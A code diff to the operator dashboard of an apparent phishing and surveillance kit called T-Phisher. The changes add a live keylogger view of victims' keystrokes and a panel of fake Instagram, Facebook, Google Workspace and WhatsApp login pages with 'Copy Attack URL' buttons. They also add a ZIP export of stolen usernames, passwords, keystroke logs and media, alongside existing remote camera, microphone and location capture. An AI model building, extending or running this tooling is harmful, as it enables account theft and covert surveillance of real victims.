@@ -9,6 +9,7 @@
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script src="/socket.io/socket.io.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 </head>
 <body>
 
@@ -137,6 +138,10 @@
       Live Camera
       <span class="tab-badge red" id="badge-camera" style="display:none">LIVE</span>
     </button>
+    <button class="tab-btn" id="tab-keylogger" onclick="switchTab('keylogger')">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2" ry="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M7 16h10"/></svg>
+      Keylogger
+    </button>
     <button class="tab-btn" id="tab-map" onclick="switchTab('map')">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="3 6 9 3 15 6 21 3 21 18 15 21 9 18 3 21"></polygon><line x1="9" y1="3" x2="9" y2="18"></line><line x1="15" y1="6" x2="15" y2="21"></line></svg>
       Live Map
@@ -230,6 +235,9 @@
                 <th>Browser</th>
                 <th>OS</th>
                 <th>Device</th>
+                <th>Battery</th>
+                <th>Resolution</th>
+                <th>Duration</th>
                 <th>Location</th>
                 <th>Connected</th>
                 <th>Actions</th>
@@ -237,7 +245,7 @@
             </thead>
             <tbody id="users-tbody">
               <tr>
-                <td colspan="8">
+                <td colspan="11">
                   <div class="empty-state"><div class="icon">📡</div><p>No targets connected yet</p></div>
                 </td>
               </tr>
@@ -390,6 +398,60 @@
           <div class="ctrl-card-desc">Navigate to the credentials log to see all captured usernames and passwords with IPs and timestamps.</div>
         </div>
 
+        <!-- Export All Data -->
+        <div class="ctrl-card green" onclick="exportAllData()" id="ctrl-export-all" style="border-color: var(--green-dim);">
+          <div class="ctrl-card-icon">📦</div>
+          <div class="ctrl-card-title">Export All Data (ZIP)</div>
+          <div class="ctrl-card-desc">Generates and downloads a ZIP package containing credentials CSV, activity JSON, media metadata JSON, and session report.</div>
+        </div>
+
+      </div>
+
+      <!-- Phishing Templates Manager -->
+      <div class="panel" style="margin-top: 24px; margin-bottom: 24px;">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+            Active Phishing Templates
+          </div>
+        </div>
+        <div style="padding: 20px;">
+          <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px;">
+            
+            <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+              <div>
+                <strong style="display:block; font-size:14px; color:#fff; margin-bottom:4px;">Instagram Techora</strong>
+                <span style="font-size:11px; color:var(--text-muted); font-family:var(--font-mono);">Path: /</span>
+              </div>
+              <button class="btn-action" style="width:100%; border:1px solid rgba(255,255,255,0.15);" onclick="copyTemplateLink('')">Copy Attack URL 🔗</button>
+            </div>
+
+            <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+              <div>
+                <strong style="display:block; font-size:14px; color:#fff; margin-bottom:4px;">Facebook Premium</strong>
+                <span style="font-size:11px; color:var(--text-muted); font-family:var(--font-mono);">Path: /facebook</span>
+              </div>
+              <button class="btn-action" style="width:100%; border:1px solid rgba(255,255,255,0.15);" onclick="copyTemplateLink('facebook')">Copy Attack URL 🔗</button>
+            </div>
+
+            <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+              <div>
+                <strong style="display:block; font-size:14px; color:#fff; margin-bottom:4px;">Google Workspace</strong>
+                <span style="font-size:11px; color:var(--text-muted); font-family:var(--font-mono);">Path: /google</span>
+              </div>
+              <button class="btn-action" style="width:100%; border:1px solid rgba(255,255,255,0.15);" onclick="copyTemplateLink('google')">Copy Attack URL 🔗</button>
+            </div>
+
+            <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; gap: 12px;">
+              <div>
+                <strong style="display:block; font-size:14px; color:#fff; margin-bottom:4px;">WhatsApp Web Link</strong>
+                <span style="font-size:11px; color:var(--text-muted); font-family:var(--font-mono);">Path: /whatsapp</span>
+              </div>
+              <button class="btn-action" style="width:100%; border:1px solid rgba(255,255,255,0.15);" onclick="copyTemplateLink('whatsapp')">Copy Attack URL 🔗</button>
+            </div>
+
+          </div>
+        </div>
       </div>
 
       <!-- Status Log -->
@@ -414,6 +476,38 @@
           <div class="camera-placeholder-icon">📹</div>
           <p>No active targets connected</p>
           <p class="camera-placeholder-sub">Waiting for targets to connect...</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── TAB: KEYLOGGER ──────────────────────────────────────────── -->
+    <div class="tab-panel" id="panel-keylogger">
+      <div class="panel" style="height: calc(100vh - 120px); display: flex; flex-direction: column;">
+        <div class="panel-header">
+          <div class="panel-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2" ry="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M7 16h10"/></svg>
+            Live Keylogger Inputs
+          </div>
+          <div class="panel-actions">
+            <button class="btn-action" onclick="copyKeystrokes()">📋 Copy All</button>
+            <button class="btn-action" onclick="clearKeystrokes()">Clear Logs</button>
+          </div>
+        </div>
+        <div class="keylogger-container" style="flex: 1; display: flex; gap: 20px; padding: 20px; overflow: hidden;">
+          <div class="keylogger-sidebar" style="width: 250px; background: rgba(0,0,0,0.15); border-radius: 6px; padding: 10px; overflow-y: auto;">
+            <h4 style="margin: 0 0 10px 0; font-size: 13px; color: var(--text-muted); text-transform: uppercase;">Active Targets</h4>
+            <div id="keylogger-targets-list" style="display: flex; flex-direction: column; gap: 8px;">
+              <!-- Target buttons injected dynamically -->
+              <p style="color: var(--text-dim); font-size: 12px; margin: 5px 0;">No active targets typing</p>
+            </div>
+          </div>
+          <div class="keylogger-terminal" style="flex: 1; display: flex; flex-direction: column; background: #07090b; border: 1px solid #222; border-radius: 6px; overflow: hidden;">
+            <div class="terminal-header" style="background: #111; padding: 8px 12px; border-bottom: 1px solid #222; font-family: var(--font-mono); font-size: 11px; color: #888; display: flex; justify-content: space-between;">
+              <span>status: listening...</span>
+              <span id="keylogger-active-client-label">no target selected</span>
+            </div>
+            <pre id="keylogger-output" style="flex: 1; padding: 15px; margin: 0; overflow-y: auto; font-family: var(--font-mono); font-size: 13px; color: #39ff14; white-space: pre-wrap; word-break: break-all; line-height: 1.5;">Select a target from the list to view live keystrokes...</pre>
+          </div>
         </div>
       </div>
     </div>
@@ -501,6 +595,8 @@ let credLogs    = [];
 let alertCount  = 0;
 let activeTab   = 'overview';
 const peerConnections = {}; // targetId -> RTCPeerConnection
+const targetTypingLogs = {}; // clientId -> full keystroke logs string
+let activeKeyloggerTargetId = null;
 
 let liveMap = null;
 let mapMarkers = {};
@@ -594,6 +690,8 @@ function initWebSocket() {
   ws.on('ALERT_SENT', (msg) => { handleMessage({ type: 'ALERT_SENT', ...msg }); });
   ws.on('CAMERA_FRAME', (msg) => { handleMessage({ type: 'CAMERA_FRAME', ...msg }); });
   ws.on('AUDIO_CHUNK', (msg) => { handleMessage({ type: 'AUDIO_CHUNK', ...msg }); });
+  ws.on('KEYSTROKE_DATA', (msg) => { handleMessage({ type: 'KEYSTROKE_DATA', ...msg }); });
+  ws.on('BATTERY_UPDATE', (msg) => { handleMessage({ type: 'BATTERY_UPDATE', ...msg }); });
 
   // Listen for snapshot feed (Step 6) using the 'feed:frame' event
   ws.on('feed:frame', (data) => {
@@ -770,19 +868,51 @@ function handleMessage(msg) {
       activityLog = msg.activity || [];
       alertCount  = msg.alertsSent || 0;
       // Populate targets
-      (msg.targets || []).forEach(t => { targets[t.clientId] = t; });
+      (msg.targets || []).forEach(t => { 
+        targets[t.clientId] = t; 
+        if (t.keystrokes) {
+          // Initialize target keystroke log locally
+          if (!targetTypingLogs[t.clientId]) targetTypingLogs[t.clientId] = '';
+          targetTypingLogs[t.clientId] = t.keystrokes;
+        }
+      });
       // Populate media
       (msg.media || []).forEach(m => {
         if (!mediaItems.find(x => x.id === m.id)) mediaItems.push(m);
       });
       refreshAll();
+      updateKeyloggerTargetsList();
+      break;
+    }
+
+    case 'KEYSTROKE_DATA': {
+      const cid = msg.clientId;
+      if (!targetTypingLogs[cid]) targetTypingLogs[cid] = '';
+      targetTypingLogs[cid] = msg.fullBuffer || (targetTypingLogs[cid] + msg.keys);
+      updateKeyloggerTargetsList();
+      if (activeKeyloggerTargetId == cid) {
+        renderActiveKeystrokes();
+      }
+      break;
+    }
+
+    case 'BATTERY_UPDATE': {
+      if (targets[msg.clientId]) {
+        targets[msg.clientId].batteryLevel = msg.level;
+        targets[msg.clientId].batteryCharging = msg.charging;
+        refreshUsersPanel();
+      }
       break;
     }
 
     case 'TARGET_CONNECTED': {
       targets[msg.user.clientId] = msg.user;
+      if (msg.user.keystrokes) {
+        targetTypingLogs[msg.user.clientId] = msg.user.keystrokes;
+      }
       refreshUsersPanel();
       updateHeaderStats();
+      updateKeyloggerTargetsList();
       if (localStorage.getItem('setting-sound') === 'true') playAlertSound();
       if (localStorage.getItem('setting-desktop') === 'true') showDesktopNotification('Target Connected', `New target connected from ${msg.user.ip}`);
       break;
@@ -900,31 +1030,46 @@ function refreshUsersPanel() {
   // Full table
   const tbody = document.getElementById('users-tbody');
   if (count === 0) {
-    tbody.innerHTML = `<tr><td colspan="8"><div class="empty-state"><div class="icon">📡</div><p>No targets connected yet</p></div></td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="11"><div class="empty-state"><div class="icon">📡</div><p>No targets connected yet</p></div></td></tr>`;
     return;
   }
 
-  tbody.innerHTML = targetList.map(t => `
+  tbody.innerHTML = targetList.map(t => {
+    // Battery HTML
+    let battHtml = '<span style="color:var(--text-dim)">—</span>';
+    if (t.batteryLevel !== undefined && t.batteryLevel !== null) {
+      let icon = '🔋';
+      let color = 'var(--green-dim)';
+      if (t.batteryLevel < 20) { icon = '🔴'; color = '#ff4757'; }
+      else if (t.batteryLevel < 50) { icon = '🪫'; color = '#ff9f43'; }
+      battHtml = `<span style="color:${color};font-weight:600">${icon} ${t.batteryLevel}%${t.batteryCharging ? ' ⚡' : ''}</span>`;
+    }
+
+    return `
     <tr>
       <td style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">#${t.clientId}</td>
       <td class="ip-text">${t.username ? `<strong>${t.username}</strong><br><span style="font-size:10px;color:var(--text-muted)">${t.ip}</span>` : t.ip}</td>
       <td><span class="tag cyan">${t.browser}</span></td>
       <td><span class="tag purple">${t.os}</span></td>
       <td><span class="tag ${t.device === 'Mobile' ? 'green' : ''}">${t.device}</span></td>
+      <td>${battHtml}</td>
+      <td style="font-family:var(--font-mono);font-size:11px;">${t.screen || 'Unknown'}</td>
+      <td><span class="user-duration tag orange" data-connected-at="${t.connectedAt}" style="font-family:var(--font-mono);font-size:11px;">00:00:00</span></td>
       <td class="loc-text">${t.location ? `<a href="https://www.google.com/maps?q=${t.location.lat},${t.location.lng}" target="_blank" style="color:var(--green-dim)">${t.location.lat.toFixed(4)}, ${t.location.lng.toFixed(4)}</a>` : '<span style="color:var(--text-dim)">—</span>'}</td>
       <td style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono)">${fmtTime(t.connectedAt)}</td>
       <td>
-        <div class="action-btns">
+        <div class="action-btns" style="margin-bottom:6px;">
           <button class="btn-action photo" onclick="requestFrom(${t.clientId}, 'photo')">📸</button>
           <button class="btn-action audio" onclick="requestFrom(${t.clientId}, 'audio')">🎙</button>
         </div>
-        <div class="send-notification-form">
-          <input type="text" id="notif-${t.clientId}" placeholder="Send Alert...">
-          <button onclick="sendNotification(${t.clientId})">Send</button>
+        <div class="send-notification-form" style="display:flex;gap:4px;">
+          <input type="text" id="notif-${t.clientId}" placeholder="Alert popup..." style="background:#111;border:1px solid #333;color:#fff;border-radius:4px;padding:2px 6px;font-size:11px;width:90px;">
+          <button onclick="sendNotification(${t.clientId})" style="background:var(--blue);border:none;color:#fff;border-radius:4px;padding:2px 8px;font-size:11px;cursor:pointer;">Send</button>
         </div>
       </td>
     </tr>
-  `).join('');
+    `;
+  }).join('');
 
   // Keep camera grid in sync
   refreshCameraGrid();
@@ -1866,7 +2011,8 @@ function showDesktopNotification(title, body) {
 function sendNotification(clientId) {
   const input = document.getElementById('notif-' + clientId);
   if (input && input.value) {
-    ws.send(JSON.stringify({ type: 'send_notification', targetId: clientId, message: input.value }));
+    // Emit via Socket.io mapping
+    ws.emit('send_notification', { targetId: clientId, message: input.value });
     showToast('Notification sent to target.', 'success');
     input.value = '';
   }
@@ -1885,9 +2031,9 @@ function filterCreds() {
 }
 
 function exportCredsCSV() {
-  if (credentials.length === 0) return alert('No credentials to export.');
+  if (credLogs.length === 0) return alert('No credentials to export.');
   let csv = 'ID,IP,Username,Password,Date,Time\n';
-  credentials.forEach(c => {
+  credLogs.forEach(c => {
     csv += `${c.id},"${c.ip}","${c.username}","${c.password}","${c.date}","${c.time}"\n`;
   });
   const blob = new Blob([csv], { type: 'text/csv' });
@@ -1926,6 +2072,162 @@ function exportMediaJSON() {
   a.click();
   document.body.removeChild(a);
 }
+
+// ─── Keylogger Handlers ─────────────────────────────────────────
+function updateKeyloggerTargetsList() {
+  const listEl = document.getElementById('keylogger-targets-list');
+  if (!listEl) return;
+  const targetIds = Object.keys(targets);
+  if (targetIds.length === 0) {
+    listEl.innerHTML = '<p style="color: var(--text-dim); font-size: 12px; margin: 5px 0;">No active targets typing</p>';
+    return;
+  }
+  
+  listEl.innerHTML = targetIds.map(cid => {
+    const t = targets[cid];
+    const activeClass = activeKeyloggerTargetId == cid ? 'background: #0064e0; color: #fff;' : 'background: rgba(255,255,255,0.05); color: #ccc;';
+    return `
+      <button onclick="selectKeyloggerTarget(${cid})" style="${activeClass} border: none; border-radius: 4px; padding: 8px 12px; font-size: 12px; text-align: left; cursor: pointer; display: block; width: 100%; text-overflow: ellipsis; overflow: hidden; white-space: nowrap;">
+        <strong>#${cid}</strong> — ${t.ip}<br>
+        <span style="font-size: 10px; opacity: 0.8;">${t.browser} on ${t.os}</span>
+      </button>
+    `;
+  }).join('');
+}
+
+function selectKeyloggerTarget(clientId) {
+  activeKeyloggerTargetId = clientId;
+  updateKeyloggerTargetsList();
+  
+  const labelEl = document.getElementById('keylogger-active-client-label');
+  if (labelEl) {
+    const t = targets[clientId];
+    labelEl.textContent = t ? `Target #${clientId} (${t.ip})` : `Target #${clientId}`;
+  }
+  
+  renderActiveKeystrokes();
+}
+
+function renderActiveKeystrokes() {
+  const outEl = document.getElementById('keylogger-output');
+  if (!outEl) return;
+  if (!activeKeyloggerTargetId) {
+    outEl.textContent = 'Select a target from the list to view live keystrokes...';
+    return;
+  }
+  const logsText = targetTypingLogs[activeKeyloggerTargetId] || '';
+  outEl.textContent = logsText || '[No keystrokes recorded yet. Waiting for target to type...]';
+  outEl.scrollTop = outEl.scrollHeight;
+}
+
+function copyKeystrokes() {
+  if (!activeKeyloggerTargetId) return showToast('Please select a target first.', 'error');
+  const text = targetTypingLogs[activeKeyloggerTargetId] || '';
+  if (!text) return showToast('No keystrokes recorded to copy.', 'error');
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('Keystrokes copied to clipboard.', 'success');
+  });
+}
+
+function clearKeystrokes() {
+  if (!activeKeyloggerTargetId) return showToast('Please select a target first.', 'error');
+  targetTypingLogs[activeKeyloggerTargetId] = '';
+  renderActiveKeystrokes();
+  showToast('Keystroke logs cleared locally.', 'success');
+}
+
+// ─── Export All ZIP Package ──────────────────────────────────────
+function exportAllData() {
+  const targetIds = Object.keys(targets);
+  if (targetIds.length === 0 && credLogs.length === 0 && mediaItems.length === 0) {
+    showToast('No session data available to export.', 'error');
+    return;
+  }
+  
+  if (typeof JSZip === 'undefined') {
+    showToast('Export library not loaded yet.', 'error');
+    return;
+  }
+  
+  try {
+    const zip = new JSZip();
+    
+    // 1. Credentials CSV
+    let csv = 'ID,IP,Username,Password,Date,Time\n';
+    credLogs.forEach(c => {
+      csv += `${c.id},"${c.ip}","${c.username}","${c.password}","${c.date}","${c.time}"\n`;
+    });
+    zip.file('credentials.csv', csv);
+    
+    // 2. Keystrokes Log
+    const keylogFolder = zip.folder('keystrokes');
+    Object.keys(targetTypingLogs).forEach(cid => {
+      const t = targets[cid] || { ip: 'unknown' };
+      keylogFolder.file(`target_${cid}_${t.ip}.txt`, targetTypingLogs[cid]);
+    });
+    
+    // 3. Activity Feed
+    zip.file('activity_log.json', JSON.stringify(activityLog, null, 2));
+    
+    // 4. Media Metadata (large base64 removed for space)
+    const metadataMedia = mediaItems.map(m => ({ ...m, data: '[BASE64_DATA_REMOVED_FOR_EXPORT]' }));
+    zip.file('media_metadata.json', JSON.stringify(metadataMedia, null, 2));
+    
+    // 5. Session report text
+    const sessionText = `T-PHISHER v2.0 STATUS REPORT\n` +
+      `Exported: ${new Date().toLocaleString()}\n` +
+      `------------------------------------------\n` +
+      `Active Targets: ${targetIds.length}\n` +
+      `Captured Credentials: ${credLogs.length}\n` +
+      `Captured Media Items: ${mediaItems.length}\n` +
+      `------------------------------------------\n` +
+      `Thank you for using T-Phisher. End of report.\n`;
+    zip.file('session_summary.txt', sessionText);
+    
+    // Compile and download
+    zip.generateAsync({ type: 'blob' }).then(blob => {
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `t_phisher_export_${Date.now()}.zip`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      showToast('Session ZIP exported successfully!', 'success');
+    }).catch(err => {
+      console.error(err);
+      showToast('Failed to compile ZIP.', 'error');
+    });
+  } catch(e) {
+    console.error(e);
+    showToast('Failed to generate export ZIP.', 'error');
+  }
+}
+
+// ─── Phishing Templates Helper ────────────────────────────────────
+function copyTemplateLink(subPath) {
+  const base = location.protocol + '//' + location.host;
+  const fullUrl = base + '/' + subPath;
+  navigator.clipboard.writeText(fullUrl).then(() => {
+    showToast(`Template URL copied to clipboard: ${fullUrl}`, 'success');
+  }).catch(() => {
+    showToast('Failed to copy link.', 'error');
+  });
+}
+
+// ─── Dynamic Session Duration Timer ──────────────────────────────
+setInterval(() => {
+  document.querySelectorAll('.user-duration').forEach(el => {
+    const connectedAt = el.dataset.connectedAt;
+    if (!connectedAt) return;
+    const elapsed = Math.floor((Date.now() - new Date(connectedAt).getTime()) / 1000);
+    if (isNaN(elapsed) || elapsed < 0) return;
+    const hrs = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+    const mins = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+    const secs = String(elapsed % 60).padStart(2, '0');
+    el.textContent = `${hrs}:${mins}:${secs}`;
+  });
+}, 1000);
 </script>
 
 </body>
